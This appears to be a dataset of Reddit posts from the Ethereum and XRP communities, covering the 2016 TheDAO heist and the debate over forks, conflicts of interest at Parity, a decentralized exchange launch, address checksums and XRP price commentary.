3) Note that the above should absolutely not be taken as an official endorsement of hardforking by either the foundation, or ethcore/slock/string, or the individual devs involved; some of the devs involved are pro-fork and some are anti-fork, **the goal is to give the community a choice**."
0,ethereum,"The big theDAO heist FAQ The big theDAO heist FAQ

**What happened?**
3,641,694 ETH where splitted out of theDAO. The attacker found a loophole in the regular splitDAO function so that they could reuse the same DAO tokens over and over again.


**How did the attack worked exactly?**
The attacker managed to combine 2 exploits. The first exploit was to call the split DAO function recursively. That means the first regular call would trigger a second (irregular) call of the function and the second call would trigger another call and so on. The following calls are done in a state before the balance of the attacker is set back to 0. This allowed the attacker to split 20 times (have to look up the exact number) per transaction. He could not do more - otherwise the transactions would have gotten too big and eventually would have reached the block limite. This attack would already have been painful. However - what made it really painful is that the attacked managed to replicate this attack from the same two addresses with the same tokens over and over again (roughly 250 times from 2 addresses each). So the attacker found a second exploit that allowed to split without destroying the tokens in the main DAO. They managed to transfer the tokens away before they get sent to address 0x0 and only after this they are sent back)
The combination of both attacks multiplied the effect. Attack one on its one would have been very capital intensive (you need to bring up 1/20 of the stolen amount upfront) - the attack two would have taken a long time. 


**Is the remaining Ether in theDAO safe?**
No - it is most likely that this exploit could have been used to drain all Ether out of theDAO. The attacker stopped draining ETH when Vitalik wrote his first blog response that mentioned the plan for soft and hard forks. We can assume that the hacker stopped for strategic reasons to make a community decision for a fork less likely. However - the attacked voted in other fork proposals as well - for more details have a look [here](http://imgh.us/The_attack_graph_03.svg)

**Update 06/21:**
*Another comment - in the case that the execution of some fork is announced it will take some time to activate this fork. In this case I think it is very likely that we will see more attacks on the DAO - not unlikely that all ETH will be drained. In this case: DO NOT PANIC. This would be expected and there are options to restore all ETH.*


**Since the Ether of the attacker is in a copy of a theDAO contract - can the ETH be stolen the same way?**
This would have been possible if at least one honest actor would have voted for this split. Since the attacker is most likely the only shareholder and the curator of this DAO the same attack can not be done.

**Update 06/20:**
*Lefteris Karapetsas found out a way how to enter the ""darkDAO"" - this allows indeed to counter attack the ""darkDAO"" and all other potential thefts.  This means that all ETH can be restored with soft forks only - read more [here](https://www.reddit.com/r/ethereum/comments/4ov5yi/all_eth_can_be_restored_with_soft_forks_only/)*

**How would the proposed soft fork work?**
The soft fork would be an immediate action to mainly buy time. Miners could modify the Ethereum client that it would ignore all transactions where as a result of the transaction ETH is deducted from an address that has the code of theDAO. Miners would also ignore blocks of other miners that would include such a transaction. If the majority of miners decides to do so it would be impossible for everyone to move ETH from every ""theDAO"" version. So it would affect the main ""theDAO"" and all the splits - including the regular and the malicious one.

**Is a software version of ETH with this modification already available?**
Yes - Parity and GETH have released proper versions.

**What needs to happen to activate the soft fork?**
It would require a coordinated effort of the majority of the miners. Coordination is important otherwise a miner would likely lose his ETH. If you for example solo mine you should NOT switch to the patched version unless you are convinced that a majority of the miners did because otherwise your software will ignore the longest chain since it would see it as invalid.

Miners need to communicate with each other and define a block in the future that should be used to switch over to the new version. As soon as the majority accepts a new version it is dangerous for a miner not to use the new version.

**If the soft fork succeeds - what is a path forward**
The softfork will most likely only a temporary solution. If it would be the final solution it would mean that basically all ETH on all theDAO contracts is frozen forever. There are two more likely paths forward. First a hard fork - with a hard fork literally everything is possible - we will discuss likely paths later. The second path from the freez softfork is to allow only certain kind of transactions. Under the assumption that no more ETH is drained from theDAO a more specific softfork 2 could allow every DTH to receive its share of the remaining ETH.

**If the soft fork does not succeed - what will happen?**
A very big mess of attacks and counter attacks. White and black heat hacker will start exploiting this bug. However since every split will be public everyone can join every split. The right strategy would be to split you tokens up to have a very small number of tokens in every split. So if someone is performing the attack others will also have shares in the splitted DAO - that will allow them later to perform this attack again in the newDAO after the creation period is over. This could result in endless splitting. It would create incentives to spam the network or to bribe miners to censor transactions. In addition it is very likely that other bugs will be found and exploited. If we would end up in this stage it is very likely that all non technical DTH would lose everything.

**What are the arguments for and against the soft fork?**
The biggest argument for the soft fork is the prevention of the huge mess that would occur without one. There are philosophical arguments against it - essentially the softfork would be a form of censorship. However - most affected by this censorship would highly welcome it (all DAO token holder) expect the attacker. However - there is a small group of people also affected by this who not might want it - everyone who spitted in a regular manner and is confident that no one of the other shareholder in this splitted DAO will atack them (e.g. because they are the only one).

**When and how is a hard fork possible?**
A hard fork would require longer discussion and consensus finding. To execute a hard fork miners are less important. More important are exchanges and key player in the ecosystem. (Ethereum foundation, core developers, leading companies in the ecosystem). If all those players agree to a hard fork even a small minority of miners would be enough but more importantly - miners would join under those conditions almost for sure. With a hard fork in principal ALL rule changes are possible. New Ether can be created, legit ETH can be destroyed and so on. However - chances are 0 that the community would agree on such a fork. So we can narrow the expected range down. On the upper end (on a scale of ETH value per DAO-token) would be a complete reversion of all illegitimate splits. That would mean that DAO tokens could again be redeemable of 0.01ETH each. The lower end would be the ratio of ETH that is left in theDAO contract - currently 0.006857 ETH (without extra balance) . However - for such a solution no hard fork would be required, it could be done with a soft fork. So a consensus solution might also be that only parts are restored. Others could be either destroyed or be used for some form of common good (e.g. Ethereum foundation, decentralized fund that will subsidize future security audits, )

**Additional information:**


**What is the difference between a hard and a soft fork.**
A soft fork means that a state/block that used to to be valid is not valid any more in the new version. In this case a state that would result in spending ETH from any contract with the code of theDAO would be considered invalid. A hard fork makes a state valid that was not valid before. The big advantage of a soft fork is that only miners need to update their software. Although eventually everyone should - if everyone waits for enough confirmations they will only accept states that are valid under the new rules. In a hard fork however everyone (consumers, exchanges, ...) need to update their software. Otherwise they are in danger of losing their ETH and other assets on Ethereum. For this reason the period between agreement on the fork and execution of the fork should be much bigger than it can be in a soft fork.


**Can we track down the identity of the attacker.**
This is an open question. There is a decent likelihood that the attack was not planned long in advance so the hacker might have done mistakes as using addresses that are linkable to their identity. Here is an [excellent overview](https://medium.com/@oaeee/the-attack-story-38f4789b3c3b#.5bavv3vmp) of the accounts involved. The hacker was careful and used only ETH from a transaction from shapeshift.

**When did the hacker started to plan this attack?**
The two key contracts that held the tokens and had the logic in that allowed the recursive split where created 2 days before the attack. So at least two days. However - a split was initiated 7 days before the attack. However - it is not yet 100% clear if the attacker and the initiator of that split are the same. It likely but not necessary. The attacker could have used any split proposal. But even if the attacker was the initiator of the split it does not mean that they were preparing the attack already back then. Under the assumption that theDAO was bug free there has been an arbitrage opportunity of buying DAO tokens for less than 0.01ETH and converting them to 0.01ETH with a split.

**If the soft fork is implemented - can I still transfer DAO Tokens?**
Yes - every transaction that does not affect the ETH balance of a contract with the code of theDAO is still possible. More details around different fork solutions can be found [here](https://medium.com/@Alex_Amsel/understanding-proposed-ethereum-forks-6abd63a478fc#.ogdrszob3)

0,ethereum,"A call for a Temporary Moratorium on the DAO Hi Everyone!
I'm making a call for a temporary moratorium on the DAO. If it goes into effect, the moratorium would last until certain security issues are resolved.

The purpose of the moratorium is to protect the DAO's token holders against the affirmative voting bias, and to prevent attacks. The fixes to these problems meet the token holders' expectations that the Curators are able to prevent majority takeover attacks, and the expectation that token holders are able to withdraw their money at any time.

This is a result of a two-week deep dive into the DAO's rules and game theory. Dino Mark and Emin Gun Sirer took a lot of time to audit the DAO's code and, with help from other community members, we have done a lot of analysis of the mechanism design/game theory of participating in the DAO.

Here's Emin Gun Sirer's blog post on the topic: http://hackingdistributed.com/2016/05/27/dao-call-for-moratorium/

Here's a work-in-progress paper documenting our analysis in detail. https://docs.google.com/document/d/10kTyCmGPhvZy94F7VWyS-dQ4lsBacR2dUgGTtV98C40/edit#

0,ethereum,"AMA w/ Erik Voorhees (ShapeShift CEO) - Ask Me Anything Hello Ethereum community!  My name is Erik Voorhees.  I've been in crypto since 2011, having worked as Head of Marketing at BitInstant, Founder and CEO of SatoshiDICE, CEO of Coinapult, and for the past three years, I've been CEO of ShapeShift, which is the world's fastest and easiest digital asset exchange (with no user accounts!).

When I started ShapeShift, Ethereum was a tiny project, not even released yet. Many people thought I was crazy for building an exchange to help people trade between ""alts,"" because Bitcoin was 99% of the market. But I saw that blockchain tokens would become an entirely new asset class, and that people would be innovating in all directions upon this new technology.

ShapeShift started very small; I still remember getting excited in the fall of 2014 that we had $3,000 in volume in one day. But Ethereum's launch and rise has really demonstrated to the world the value of multiple blockchain assets, and specifically, tokens representing all manner of value. Today, ShapeShift processes over 15,000 customer orders per day, averaging around $10-15 million in value. 

As an early Bitcoiner, I believe strongly that many digital assets will become widespread in the market, and Ethereum has proven this to be the case thus far. Our recent product, Prism, is built entirely on Ethereum smart contracts, and hopefully helps prove this technology in front of a continually skeptical world.

Ask me anything!

EDIT: AMA is over, thank you everyone for the great questions. Sales pitch: get on the list to try out Prism at https://Prism.Exchange  Also, THANK YOU ALL for building Ethereum. Take your role in this story seriously.

0,ethereum,"On the economic incentives of Parity for Ethereum development *Edit: Guys, personal attacks on others are unacceptable, period. I think there are real issues to discuss and debate here, but the opinion and statements of one developer are not one of them. I hope this can be the beginning of a rational discussion on what could be an important long term issue around managing COIs, but repeated personal attacks on one person who has done a lot for the community are unacceptable. Please be civilized.*

I am not anti-Parity (so in advance, please, spare me the ""Parity has done a tremendous amount for Ethereum"" ... I know that).

*But I am pro-economic incentives.* And rational, unemotional economic incentives should be something many around here understand (or at least try to), given that they are critical to the operation of cryptocurrency blockchains.

So let's just look at the incentives: As the primary developers of Polkadot (with many of their devs holding a substantial amount of DOTs), Parity has a *huge financial incentive* for Ethereum to fall behind on its Eth 2.0 and Eth 1.x roadmaps.  If Ethereum does fall behind, it provides Polkadot with more of a chance for to become prominent for certain use cases- either by seizing existing market share of Ethereum, or expanding the market in ways that benefit them (perhaps before Ethereum could do so).  Such a situation would inevitably boost the value of DOTs.

There may be room for multiple projects in this space, but a big part of Ethereum's value proposition is having a critical mass of activity upon it (via L1 and L2).  Fragmenting economic activity across multiple networks is detrimental to that important network effect at this point.

Polkadot claims to be complementary to Ethereum, *but how*?  I mean *really* how, not ""hand-waving and hugs"" how.  What value are they adding to Ethereum that L2 and Eth 2.0 can't achieve?  Is their only value that they plan to be interoperable with Ethereum?  If so, I see how this benefits Polkadot, but I do not see how it benefits Ethereum.  If they really wanted to complement Ethereum, why aren't they launching as an L2 upon it?  Why does Polkadot need to be an L1?

What are ways in which these financial incentives might be counter balanced?

1) The holders of DOTs also hold *a lot* of ETH.  But this is not perfect, as DOTs with a relatively small ICO valuation (compared to current ETH market cap) *may* have easier accessible upside.  In this way, holding an equivalent amount of ETH to DOTs (in fiat-terms) could really be viewed as an insurance policy against Polkadot failing.
2) Polkadot demonstrates how it really is a complement to Ethereum, and not just a leech upon it.  I don't know how, but they need to show that they are dependent upon Ethereum's success in order for them to succeed.  So far, I do not see this vision.

Sorry, those are just the facts (as inconvenient as they may be).

I don't know what to do about them, but ignoring potentially perverse incentives behind one of the most important Ethereum development organizations is probably not the best approach.  Not everyone is going to win in this market, and seeing a potentially VC-controlled coin with on-chain governance as a big winner is not something I really care about.  That's not why I became interested in this space in the first place."

0,ethereum,"In celebration of the upcoming Devcon 2, I'd like to share a few words about why Ethereum sucks, why you all suck, and why you should worship at my feet. Prepare to be enlightened. I've said this so many times, but somehow you all seem to be blind to my genius.  Ethereum and all these other altcoin disasters are an absolute disgrace to the Bitcoin community.  You all are trampling on Satoshi's grave by exploring non-bitcoin solutions to the world's problems.  How you don't see that is beyond me.  

And now you're going to have your little get-together in China and discuss ideas that weren't Satoshi's or mine, and it really gets my goat.

So, since you have such a hard time understanding that your efforts are worthless and your projects are all complete shit, I'm going to lay it out for you very simply and clearly in an analogy that even a comatose jellyfish could comprehend.

Let's compare blockchain technology to the  transportation industry.  In this scenario, Satoshi Nakomoto is like Henry Ford, and Bitcoin is like Ford motorcars. 

Ford Motors was established in 1903 when Henry Ford had a vision for mass produced cars, and he made it come true.   He got it right from the start, and his Model T is the gold standard for automobiles.

However, it wasn't long before fakers and scammers came out of the woodworks, trying to improve on the perfection that Henry had crafted.  Scamcar brands proliferated, each claiming to have some new innovation that was better than Ford.  I'm not going to even mention their brand names; they do not even merit a mention.   But they claimed to make improvement in areas such as ""engine efficiency,""  ""Aerodynamics,"" and ""comfort,"" bullshit made-up problems they invented so they could sell their own cars.

And the goddamn moron general public ate it up, because the scamcar dealers were such good marketers.  But it was all marketing hype; none of the altcars ever came to be anything successful.  

But the scammers didn't stop there.  They started building ""specialty"" cars for certain situations.  Some people claimed they wanted to dig in the ground with their cars, so a company named Caterpillar  (More like Scampterpillar) built some cars they claimed could dig in the ground and help with construction.   What the fuck was the point?  Get a goddamn shovel and stick some dirt in the back of your Model T; it can carry dirt better than anything around.  Again, the scammers were solving problems that simply didn't exist, and the hyper-gullible public took it hook, line, and sinker.  If they'd only listened to me.

And, what all the scamcar fans and engineers and everyone involved don't seem to understand is, that by creating transportation projects and research that is not based on the Model T, or onHenry Ford's ideas, or my ideas, YOU ALL ARE SPITTING ON HENRY FORD'S GRAVE!!  STOP IT YOU DISRESPECTFUL BASTARDS!

So why don't you print off this analogy and read it as the opening speech of your little China party, and then when you all see the light you can just cancel the rest and go home and watch some videos of me talking about myself.  You'll be much better off in the end.

Edit:  Fixed a typo.  Not that I made a mistake, but that the goddamned English language couldn't sufficiently express my ideas, so I had to improve it."
0,ethereum,"And Meanwhile, A Multi-Million Dollar Market Forms in a Week... People are really missing the meat of what's happening with crypto-kittes.

What we witnessed is in the course of a week an entirely new market form, hundreds of thousands of dollars lost and made, an entirely new hybrid financial instrument/collectable with new properties, a series of trading algorithms developed in that week to take advantage of the new financial instrument...

This is just a microcosm of things to come. New markets, new forms of financial instruments, will rise and fall over days and weeks, taking what used to cost millions of dollars and years to create down into a few lines of code.

The good is that rent-seeking will go down, access to financial tools will go up, and there will be more opportunities for financial mobility. The bad is that with the speed of new developments, the tightly coupled/automated nature of smart contracts, and the lack of an off button, bubbles, crashes, and negative feedback loops can quickly and easily impact the system.

0,ethereum,"Ethereum 1 year old today. Happy Birthday!! Ethereum has achieved so much in the last 12 month and im looking forward to this speeding up over the next 12 months.

So much has been achieved. There are over 671 blockchain project listed on http://coinmarketcap.com/ mostly doing the same as Bitcoin and a few doing different things but there is actually a lot more. Apart from these 671 there are 246 more projects that are building on top of Ethereum http://dapps.ethercasts.com/ and plenty more which are still in Stealth mode we dont even know about.
None of the 671 projects are inter-operable with each other (can speak to each other) but the 243+ project on Ethereum are  inter-operable with each other and i think this is the big thing that set Ethereum apart from the rest and the future looks bright IMO. Ethereum started in 2014 with 40+ developers and moved into the 100's in 2015 and this year there are 1000's of Developers working on Ethereum Ecosystem. No other project can claim this size of a build out.

Look forward to the next 12 months and Happy Birthday to all!!"
0,ethereum,"Let's Talk About Parity: Stopping the Mob Mentality /u/DCInvestor recently made an [excellent post](https://www.reddit.com/r/ethereum/comments/ar2xxh/on_the_economic_incentives_of_parity_for_ethereum/) about the incentives of Parity, but I was disappointed by the comments. As someone who has taken pride in the community's collaborative and accommodating nature, it was heartbreaking to see people immediately reach for their pitchforks about Parity. It gave me flashbacks to how the Bitcoin schism started. Can we do better job as a community to have even-headed discussion?

Like /u/DCInvestor, I'm also not anti-Parity. I respect what they've done for the community. I also hope that they can continue to contribute as they have done so willingly in the past. Like /u/DCInvestor, I work in an industry that requires thorough disclosures and avoidance of conflict of interest, so I understand the need to align incentives between parties in the market. I also empathize with those frustrated about Parity recently. It's unfortunate that /u/5chdn has made strident remarks against the ETH2.0 roadmap and that Parity has been the source of some recent bugs in software.

That being said, I believe we're actively destroying the community when we're holding up Parity and its developers to a standard of virtue that will never be realistic. Once we start the Salem Witch Trials for anyone who has any hint of a conflict of interest, we will have no community left. We will become like Bitcoin Core all over again.

Here's the unpleasant truth: conflict of interest will always exist, especially in a community like Ethereum that espouses to not be chain-maximalist. Don't hate the player; hate the game. We've always ENCOURAGED projects like Polkadot and others like Cosmos. If you want to give Parity crap about starting Polkadot, you also have to start questioning the community's values for a multi-chain future. In fact, many of the comments in the attached thread did exactly that.

Now, I believe it's fair to be skeptical of this approach, especially when naively following it will encourage bad actors, but I also think we need to keep in mind why we created this approach in the first place. It comes down to innovation. Innovation in the Bitcoin community ground to a halt when people began branding every alternative take as a shitcoin. Conversely, research in areas adjacent to Ethereum has exploded because we've continually welcomed teams like EOS, IOTA, Cosmos, and Polkadot to build ERC-20 tokens on top. Their research, successes, and failures will benefit Ethereum just as Ethereum's scale benefits them.

Another unpleasant truth: the ETH2.0 development is still extremely experimental and fraught with risk. ETH2.0 developers and the EF may have a clear vision about Ethereum's future, but there's no guarantee that it'll come to fruition. What if the current sharding spec fails and we have to redesign it? Wouldn't it be better to have adjacent experiments with concrete results that can point us in the right direction?

I believe many people here have an incorrect perspective of research-driven projects. Ground-breaking research flourishes an open and accepting environment for competing visions, not with a couple of researchers burying their heads in a problem with monomaniacal focus. And let's be honest: Ethereum needs the research just as much as everyone else.

It's easy to accept these principles when Ethereum is doing well, but it's most important to accept them when Ethereum is not doing well. And yes, Ethereum has not had its best few months lately, at least in the court of public opinion. The delay of Constantinople, continued stagnation of price, and concerns about roadmap completion have made it hard to stick to our open-minded philosophy. However, this does not mean we should push our frustrations on developers and hold them to unrealistic standards.

One final uncomfortable fact: Parity is not the only one with conflicts-of-interest. Vlad Zamfir sits on the board for RChain, a separate blockchain with no affiliation to Ethereum. He presumably has a big stake in RChain, and he's also been critical of Ethereum in the past, calling it shitty software. Wouldn't he stand to benefit if Ethereum fails as well? Ethereum's research partners for Zk-SNARKS have Zcash. Could their work with us merely be a ploy for further PR on Zcash? I bring up these examples not because I think there's a ""slippery slope."" This is a logical fallacy.

I bring these examples up because I believe the most productive line of conversation first starts with revisiting our community values and standard of ethics before we give Parity a fair chance at explaining themselves. As we consider Parity's position, we need to apply their standard of behavior to all the other people who are not ""under trial."" We don't want to set bad precedents that then lead us down the dark road of radicalization. Parity also deserves the benefit of a doubt because they've contributed to the community for so long even before the $5M grant. They're the #2 node software for a reason, and we can't neglect that fact when we consider their case.

One last tangential note: I recently read about Russian strategies to destabilize communities on social media.  Apparently, one of their favorite strategies was to log onto their site and post very radical statements that supposedly support the community (e.g. on a anti-Trump site, they might spam messages that Trump is a fascist). These statements would disgust the more moderate members of the community, leading the community to fracture into smaller, less influential elements. I bring this up because we're essentially doing the same thing to ourselves right now. By accusing Parity and folks like Afri of a conspiracy without conclusive evidence and due process, we're nothing better than a mob looking for a witch to burn.

I think we can do better than that. I'm sure you do too.

0,ethereum,"We spent the last few months building Lake Trade - A beautiful, ZERO-FEE decentralized trading platform powered by Ethereum and 0x. We'd love the ETH community's feedback! Hey fellow buidlers and hodlers üëã

For the past few months, we've been working around the clock on building a ZERO-FEE decentralized trading platform called Lake Trade, where you can trade directly out of your Ethereum wallet. We're super excited to finally launch it on Reddit!

We've built this on Ethereum and the 0x protocol, and designed it from the ground up to be secure, fast and user-friendly. Building on 0x gives us immediate, **shared liquidity** with the 0x network, which means you can start trading today and see real volume on our platform.

https://preview.redd.it/2kpo1i7s3ly11.jpg?width=1000&format=pjpg&auto=webp&s=44d29c1cdef0d6c31c39b2cb7685026e472d7c26

## Try Lake Trade now!

[http://trade.lakeproject.co](http://trade.lakeproject.co/)

## It's not perfect, here's what to expect:

* Centralized exchanges will have higher liquidity
* Trade execution is slower but improving (they're getting pretty good!)
* You will need to pay Ethereum gas fees (significantly less than most exchange fees)
* We maintain an open order book, we do not match trades directly like centralized exchanges
* Unfortunately for compliance reasons we currently do not support the US (We're working on this, but it takes time and money)

Now, you might be thinking: ""Not another relayer - what's so special about this one?""

## Here's what makes Lake Trade great:

* **Zero-Fee Trades** \- We believe in creating things of value, not paywalls
* **Millions $ in Volume** \- We have shared liquidity with the 0x network
* **Trade Popular ERC-20 Tokens** \- DNT, BAT, REP, REQ, OMG and more!
* **User-Friendly & Powerful** \- We built an intuitive and beautiful platform for trading ERC-20 tokens, with more to come (margin trading, derivatives)
* **Portfolio features** \- So far we've implemented charts to show the allocation of your balances, with other analytics on our roadmap
* **Trade From Your Wallet** \- No signups. We support Metamask, with Ledger and Trezor support soon!
* **Real Customer Support** \-  We ACTUALLY have customer support with live chat or email

# Lake Trade is one piece of our vision - We're aiming to build Finance 2.0

**For the first time in history, we have a technology that enables us to build a globally inclusive, frictionless, and peer-to-peer financial system**: one that enables us to trade value directly with each other, all while having full custody of our assets and money.

By harnessing this new technology and building the right tools, we can create markets that are more transparent, inclusive, efficient and user-centric.

To get there, we need to build a decentralized financial stack. As a team, we are determined to be at the forefront of building secure, user-first products that empowers people to preserve their wealth, trade seamlessly, and do commerce globally at low cost.

## To realize this new future, we need to work collaboratively with regulators

As I'm sure everyone's aware by now of EtherDelta's SEC charges. This obviously has implications for the Lake Project and our trading platform.

We believe it's crucial to build a cooperative relationship with regulators, and work together to build meaningful progress and to advance adoption of cryptocurrencies. To do that, we are doing our best to be compliant with securities laws and applicable regulations.

To be compliant, we're taking the following steps:

1. We have a due diligence process in place to ensure we list only utility tokens. We do **not** list any security tokens
2. We have built blacklist capabilities to prevent access to our trading platform for regions where it's illegal to trade the tokens listed on Lake Trade
3. We've put terms and conditions in place to reflect these regulatory requirements where applicable
4. We're actively talking to industry experts and legal counsel on best steps forward to be compliant

## What's Next? Automatic Investing powered by our A.I.

The often overlooked piece in Finance 2.0 is wealth preservation and growth. We need tools that anyone can take advantage of, at significantly lower costs than traditional investment options today.

With our team's deep expertise in data-science and AI, our next goal is to build an AI-driven investment fund **available to anyone, anywhere**. We've already made good progress on the AI, and we've begun rigorous back-testing to ensure performance.

We'll be posting more updates on this as we do more comprehensive testing with our AI. If you want to stay connected, please subscribe to our mailing list on our website at [http://lakeproject.co](http://lakeproject.co/)

## Help us build a next-generation Open Financial System

We're on a mission to build great products that empower people all over the world to make the right economic decisions for their needs. Lake Trade is just the beginning, and we have more ideas we're exploring.

Please leave a comment with your constructive feedback and we'd be happy to work with everyone to fix any issues, build out new useful features, or help tackle other challenges in the crypto-space!

The most important thing that can ensure our success as as startup is more users adopting our products. This allows us to become eligible for grants, apply for funding, raise money, and operate a sustainable business.

# FAQs About Lake Trade

## How do you make money if Lake Trade is feeless?

As traders ourselves, we don't believe in nickle and diming for every trade, all you need is to cover the Ethereum gas fees yourself, and you can trade as much as you want.

We believe that if we can deliver features that have true utility and value to our users, then they'll be willing to pay for those. We have plans to introduce portfolio management tools, and other value-added features down the road.

We also plan to introduce an intelligent AI-driven investment fund that operates on top of Lake Trade you can easily buy into.

## How do I know it's secure?

You have full control of your funds, as you're trading directly peer to peer through Lake Trade, by securely connecting your wallet. You never need to hand over your private keys, or entrust any of your money to us.

## How do I get started with Lake Trade?

All you need is some ETH in an Ethereum wallet (Metamask), and you're all set. Simply visit [http://trade.lakeproject.co](http://trade.lakeproject.co/) to trade.

## How come you don't support the US?

With the recent EtherDelta SEC charges, it's clear that the SEC is cracking down and frowning upon decentralized trading platforms who are listing security tokens or operating without proper licenses. Many tokens are deemed securities by the SEC, and under current regulations in the US, it's illegal to grant access to trade securities to US citizens without being a licensed entity with the rights to do so.

We have no intentions to facilitate any illegal activities, and we believe that in order to achieve mass adoption of crypto, it's important to work together with regulators in a collaborative manner, and we understand that it's the role of regulators to step in and protect consumers. Currently, that means we need to comply with existing laws and move forward with registering for the proper licenses.

We look forward to working with regulatory bodies to advance this space forward, and develop new sensible regulations for this disruptive technology and new asset class.

0,ethereum,"Should we make a move toward making checksummed hex addresses mandatory? For those not ""in the know"", when using tools in the Ethereum ecosystem now, you see addresses in two different forms:

0x3bb9557113fbb052dae3008a2801a072c432c018

And:

0x3bb9557113FBb052dAE3008A2801a072C432c018

The mixed-case addresses actually have meaning: the specific choice of whether to use a lowercase or uppercase letter is taken from the hash of the address, and this serves as a form of error detection - if you slip up and mistype a character, then it's overwhelmingly likely that the uppercase/lowercase choice for the remaining letters will become incorrect, and the address will be rejected.

However, the error-detection benefits of checksumming are limited now, for two reasons. First, not all applications check checksums. Second, because some applications give you all-lowercase addresses, other applications have to accept them, and so the all-lowercase form is accepted as an alternate legitimate representation of any address. This means that even users that do use checksummed addresses incur a higher risk of the checksum mechanism not catching a mistake.

0,xrp,"Thoughts from Korea Hi everyone,

Been following the Ripple subreddit for a while from Korea. I've seen a lot of people sharing their thoughts on Ripple's recent price drop and wanted to add my own thoughts based on what I've been seeing in Korea. (Please keep in mind that the following are just my thoughts).

I think the whole CoinMarketCap exclusion did affect the price somewhat, but I think it's more related to Korean investors cashing out this week and with that, the sudden fall of the ‚Äúpremium‚Äù Korea run that was driving up Ripple‚Äôs price (and most other coins). Rather than thinking Ripple is dropping, however, I think it‚Äôs normalizing to the price point of what it‚Äôs actually worth ‚Äì meaning, without the Korean premium.

Some background (which many of you might already be aware of). Korean investors contributed a lot to Ripple‚Äôs price rise. The push started last November when many Koreans starting jumping on the FOMO cryptocurrency bandwagon after Bitcoin was all over the news (check out the web traffic of Korean exchange sites and you can see the huge jump from November forward). From December, Ripple became the savior coin with its relatively low price, the influx of global news coverage, Korean banks testing Ripple, WOM, and so on and so on. There was a sudden expectation that Ripple would see ‚Äúto the moon‚Äù type growth ‚Äì meaning, easy money for a lot of Koreans. So more than any other coin, Koreans invested in Ripple (that‚Äôs why more than any other coin, Ripple is being the most affected when people panic sell ‚Äì getting to that).

However, unlike many of you who are in it for Ripple‚Äôs technology and are well aware of cryptocurrency itself, a lot of the Korean investors are only in it for the money ‚Äì a lot of them being newbies to investment. With that said, many of these people have weak hands and sell if they get scared (these kinds of investors are called ‚Äúants‚Äù in Korea). This week especially, a lot of news has been coming out in Korea that are making investors like this scared and cashing out, which I believe is affecting Ripple‚Äôs price this week (along with many others).

News that has been hitting Korea this week: - People under 18 banned from trading on Korean exchanges - Foreigners (whether all or those not living in Korea) banned / will be banned from trading on Korean exchanges - Government investigation into exchanges - Government stating that they can ‚Äúshutdown‚Äù exchanges at anytime - Government stating that they are working on tax policies regarding money made from trading cryptocurrency - News of China stopping people from mining coins

****update : news from today 1/11 said that the Ministry of Finance in Korea is thinking of making cryptocurrency online exchange platforms illegal, other news came out stating that Bithumb will be investigated...

The news hit pretty hard this week and once it hit, things started to fall. I remember looking at Bithumb thinking everything was ok in the morning ‚Äì even after the ‚Äúno new coins‚Äù to be added on Coinbase and CoinMarketCap news was already out and circulating. But when I checked again in the evening, the whole market started to fall. So I checked the Korean news and found out that the things listed above were circulating. It caused a lot of FUD. And when prices started to drop, everyone started to cash out. News is still going around every day and people here are worried. They are not confident in the cryptocurrency market because everything is unsure and they are nervous about government regulation (more and more news coming out about Korean and Chinese governments taking action). Most people want to ride the wave but get out in fear of the crash that may come with it. And here we are.

For Ripple to regain its previous price point, I think the rest of the world needs to pick up the slack. No more dependence on the Koreans (at least for now) to pull things up because things are getting tighter here. (I kind of wished the whole cryptocurrency thing spread out slowly instead of like wildfire that raised red flags overnight...)

Anyways, I personally am a Ripple investor and have been HODLing during this massive train wreck. I do believe Ripple was a bit overvalued because of the over speculation and Koreans driving prices up, but I also believe that Ripple is capable of hitting and maintaining $6~8 this year. So even with the drop, I‚Äôm confident it will rise again.

Thanks for taking the time to read. Hope it gave some insight as to what might be happening."

He obviously didn't have any insider info but did mention it makes sense that eventually they will use xRapid since they would of already set up the infrastructure when integrating xCurrent.

0,xrp,"Observations from a US Stock Market Trader Hi everyone! I'm new to this community. Hell, I'm new to Reddit. I've been looking at these XRP threads for some time now. I see many people losing their minds over price drop. Having been an avid investor in the US stock market over the years, I can say with a matter of certainty that there is no certainty with investments. An investment, no matter how fundamentally sound it may be, is still a risk. Some people invest on technicals. Some on fundamentals. Sometimes I momentum trade on fundamentally sound stocks. When it comes to coins, some I invest in for fun. Some I invest in based on my belief in the coin. My research into the product (XRP) has led me to the conclusion that Ripple is one of (if not the best) investment for my money. The solution they offer for the financial industry can benefit all. I will venture to say it offers more power to the financial institutions and the consumer than BTC or ETH. This is an investment I believe in. As with many investments, it may take time to come to fruition. Don't expect to plant an apple tree and start reaping its fruit the next week. If you are in Ripple for a fast buck, you may be disappointed. However, if you are a true investor in their product, just hold it. If you have money you cannot afford to lose in your investment, SELL! Relax. The way I see it, Ripple is on sale. I'll wait for a solid uptick from the bottom and buy some more. Take a deep breath. Believe in the product. Let the market stabilize. Watch emerging news and emerging markets. This may be a risk, but for me, it is a calculated risk. XRP will perform. They have a great team backing it. :)"
0,xrp,"Can we stop with the XRP ""mooning"" posts? They are a bit ridiculous to be honest. Just a few minutes ago I saw yet another post claiming XRP is * stable and is about to moon*, when in fact XRP is on a slight downtrend. 

It's almost like an insecure person that keeps asking you if they are attractive ALL THE TIME. Over and over and over again. Their level of attractiveness is never the issue, except *inside their own head*. Their insecurity is the biggest problem. The fear. 

I assume everyone is investing in XRP *after* doing their research. So if you really believe in XRP you don't need to constantly pretend everything is fine *all the time*. Sometimes things are not going to plan. And that's OK. And just by discussing it it doesn't mean you don't believe in it anymore.

Imagine we all pretend *everything is perfectly fine all the time* and we just tell each other that XRP is on the up, even when it might not be. That would be madness, right? Well, that is what is happening.

I do understand there is a lot of FUD and we need to counter it. But *to the moon* is an idiotic, simplistic counter argument. And there are a lot of posts like this.

I do believe in XRP, i am all in on XRP. I am a little disappointed that there is a slight downtrend even after the MoneyGram news. There must be other things at play here. There is a bigger picture that we're not seeing (to the moon, whales and lambos only cloud our vision even more). I can't figure out what it is just yet, and I'm sure the majority of us can't explain it either. It could be nothing. Why can't we have mature discussions trying to understand this?

Do you think that the people working at RIPPLE  start their day wondering when will XRP go to the moon? Of course not. Even though there might be some implicit beliefs in that. What they are doing is developing this and making it the best it can be. One day at a time. By the time it gets to the moon, there wil be no need to scream it out because it will feel like such a natural progression after so much hard work.

0,xrp,"Adoption of XRP as a Gaming Currency on The Rise Lately, Ripple has been making waves in the gaming industry. In March, the company launched a massive project to integrate blockchain tech into games‚Äîfeaturing a $100 million fund for developers. 

XRP is also on the rise as a native payment currency, particularly amongst online gambling platforms. 

